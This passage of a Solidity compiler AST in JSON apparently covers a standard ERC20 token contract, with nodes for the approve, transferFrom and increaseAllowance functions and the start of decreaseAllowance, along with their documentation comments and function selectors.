										"src": "4075:9:0"
									},
									"scope": 586,
									"src": "3987:149:0",
									"stateMutability": "view",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										651
									],
									"body": {
										"id": 165,
										"nodeType": "Block",
										"src": "4533:108:0",
										"statements": [
											{
												"assignments": [
													153
												],
												"declarations": [
													{
														"constant": false,
														"id": 153,
														"mutability": "mutable",
														"name": "owner",
														"nameLocation": "4551:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 165,
														"src": "4543:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 152,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "4543:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 156,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 154,
														"name": "_msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 701,
														"src": "4559:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
															"typeString": "function () view returns (address)"
														}
													},
													"id": 155,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4559:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4543:28:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 158,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 153,
															"src": "4590:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 159,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 144,
															"src": "4597:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 160,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 146,
															"src": "4606:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 157,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 520,
														"src": "4581:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 161,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4581:32:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 162,
												"nodeType": "ExpressionStatement",
												"src": "4581:32:0"
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 163,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4630:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 151,
												"id": 164,
												"nodeType": "Return",
												"src": "4623:11:0"
											}
										]
									},
									"documentation": {
										"id": 142,
										"nodeType": "StructuredDocumentation",
										"src": "4142:297:0",
										"text": " @dev See {IERC20-approve}.\n NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n `transferFrom`. This is semantically equivalent to an infinite approval.\n Requirements:\n - `spender` cannot be the zero address."
									},
									"functionSelector": "095ea7b3",
									"id": 166,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "4453:7:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 148,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "4509:8:0"
									},
									"parameters": {
										"id": 147,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 144,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "4469:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 166,
												"src": "4461:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 143,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4461:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 146,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "4486:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 166,
												"src": "4478:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 145,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4478:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4460:33:0"
									},
									"returnParameters": {
										"id": 151,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 150,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 166,
												"src": "4527:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 149,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4527:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4526:6:0"
									},
									"scope": 586,
									"src": "4444:197:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										663
									],
									"body": {
										"id": 198,
										"nodeType": "Block",
										"src": "5306:153:0",
										"statements": [
											{
												"assignments": [
													180
												],
												"declarations": [
													{
														"constant": false,
														"id": 180,
														"mutability": "mutable",
														"name": "spender",
														"nameLocation": "5324:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 198,
														"src": "5316:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 179,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5316:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 183,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 181,
														"name": "_msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 701,
														"src": "5334:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
															"typeString": "function () view returns (address)"
														}
													},
													"id": 182,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5334:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5316:30:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 185,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 169,
															"src": "5372:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 186,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 180,
															"src": "5378:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 187,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 173,
															"src": "5387:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 184,
														"name": "_spendAllowance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 563,
														"src": "5356:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 188,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5356:38:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 189,
												"nodeType": "ExpressionStatement",
												"src": "5356:38:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 191,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 169,
															"src": "5414:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 192,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 171,
															"src": "5420:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 193,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 173,
															"src": "5424:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 190,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 346,
														"src": "5404:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 194,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5404:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 195,
												"nodeType": "ExpressionStatement",
												"src": "5404:27:0"
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 196,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "5448:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 178,
												"id": 197,
												"nodeType": "Return",
												"src": "5441:11:0"
											}
										]
									},
									"documentation": {
										"id": 167,
										"nodeType": "StructuredDocumentation",
										"src": "4647:551:0",
										"text": " @dev See {IERC20-transferFrom}.\n Emits an {Approval} event indicating the updated allowance. This is not\n required by the EIP. See the note at the beginning of {ERC20}.\n NOTE: Does not update the allowance if the current allowance\n is the maximum `uint256`.\n Requirements:\n - `from` and `to` cannot be the zero address.\n - `from` must have a balance of at least `amount`.\n - the caller must have allowance for ``from``'s tokens of at least\n `amount`."
									},
									"functionSelector": "23b872dd",
									"id": 199,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "5212:12:0",
									"nodeType": "FunctionDefinition",
									"overrides": {
										"id": 175,
										"nodeType": "OverrideSpecifier",
										"overrides": [],
										"src": "5282:8:0"
									},
									"parameters": {
										"id": 174,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 169,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "5233:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 199,
												"src": "5225:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 168,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5225:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 171,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "5247:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 199,
												"src": "5239:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 170,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5239:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 173,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "5259:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 199,
												"src": "5251:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 172,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5251:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5224:42:0"
									},
									"returnParameters": {
										"id": 178,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 177,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 199,
												"src": "5300:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 176,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "5300:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5299:6:0"
									},
									"scope": 586,
									"src": "5203:256:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "public"
								},
								{
									"body": {
										"id": 227,
										"nodeType": "Block",
										"src": "5948:140:0",
										"statements": [
											{
												"assignments": [
													210
												],
												"declarations": [
													{
														"constant": false,
														"id": 210,
														"mutability": "mutable",
														"name": "owner",
														"nameLocation": "5966:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 227,
														"src": "5958:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 209,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "5958:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 213,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 211,
														"name": "_msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 701,
														"src": "5974:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
															"typeString": "function () view returns (address)"
														}
													},
													"id": 212,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5974:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5958:28:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 215,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "6005:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 216,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 202,
															"src": "6012:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 222,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"arguments": [
																	{
																		"id": 218,
																		"name": "owner",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 210,
																		"src": "6031:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"id": 219,
																		"name": "spender",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 202,
																		"src": "6038:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 217,
																	"name": "allowance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 141,
																	"src": "6021:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_view$_t_address_$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address,address) view returns (uint256)"
																	}
																},
																"id": 220,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "6021:25:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"id": 221,
																"name": "addedValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 204,
																"src": "6049:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "6021:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 214,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 520,
														"src": "5996:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 223,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5996:64:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 224,
												"nodeType": "ExpressionStatement",
												"src": "5996:64:0"
											},
											{
												"expression": {
													"hexValue": "74727565",
													"id": 225,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "6077:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 208,
												"id": 226,
												"nodeType": "Return",
												"src": "6070:11:0"
											}
										]
									},
									"documentation": {
										"id": 200,
										"nodeType": "StructuredDocumentation",
										"src": "5465:384:0",
										"text": " @dev Atomically increases the allowance granted to `spender` by the caller.\n This is an alternative to {approve} that can be used as a mitigation for\n problems described in {IERC20-approve}.\n Emits an {Approval} event indicating the updated allowance.\n Requirements:\n - `spender` cannot be the zero address."
									},
									"functionSelector": "39509351",
									"id": 228,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "increaseAllowance",
									"nameLocation": "5863:17:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 205,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 202,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "5889:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 228,
												"src": "5881:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 201,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5881:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 204,
												"mutability": "mutable",
												"name": "addedValue",
												"nameLocation": "5906:10:0",
												"nodeType": "VariableDeclaration",
												"scope": 228,
												"src": "5898:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 203,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5898:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5880:37:0"
									},
									"returnParameters": {
										"id": 208,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 207,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 228,
												"src": "5942:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 206,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "5942:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5941:6:0"
									},
									"scope": 586,
									"src": "5854:234:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "public"
								},
								{
									"body": {
										"id": 268,
										"nodeType": "Block",
										"src": "6674:328:0",
										"statements": [
											{
												"assignments": [
													239
												],
												"declarations": [
													{
														"constant": false,
														"id": 239,
														"mutability": "mutable",
														"name": "owner",
														"nameLocation": "6692:5:0",
														"nodeType": "VariableDeclaration",
														"scope": 268,
														"src": "6684:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 238,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "6684:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 242,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 240,
														"name": "_msgSender",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 701,
														"src": "6700:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
															"typeString": "function () view returns (address)"
														}
													},
													"id": 241,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6700:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6684:28:0"
											},
											{
												"assignments": [
													244
												],
												"declarations": [
													{
														"constant": false,
														"id": 244,
														"mutability": "mutable",
														"name": "currentAllowance",
														"nameLocation": "6730:16:0",
														"nodeType": "VariableDeclaration",
														"scope": 268,
														"src": "6722:24:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 243,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "6722:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 249,
												"initialValue": {
													"arguments": [
														{
															"id": 246,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 239,
															"src": "6759:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 247,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 231,
															"src": "6766:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 245,
														"name": "allowance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 141,
														"src": "6749:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$_t_address_$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address,address) view returns (uint256)"
														}
													},
													"id": 248,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6749:25:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6722:52:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 253,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 251,
																"name": "currentAllowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 244,
																"src": "6792:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"id": 252,
																"name": "subtractedValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 233,
																"src": "6812:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "6792:35:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726f",
															"id": 254,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6829:39:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f8b476f7d28209d77d4a4ac1fe36b9f8259aa1bb6bddfa6e89de7e51615cf8a8",
																"typeString": "literal_string \"ERC20: decreased allowance below zero\""
															},
															"value": "ERC20: decreased allowance below zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f8b476f7d28209d77d4a4ac1fe36b9f8259aa1bb6bddfa6e89de7e51615cf8a8",
																"typeString": "literal_string \"ERC20: decreased allowance below zero\""
															}
														],
														"id": 250,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "6784:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 255,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6784:85:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 256,
												"nodeType": "ExpressionStatement",
												"src": "6784:85:0"
											},
											{
												"id": 265,
												"nodeType": "UncheckedBlock",
												"src": "6879:95:0",
												"statements": [
													{
														"expression": {
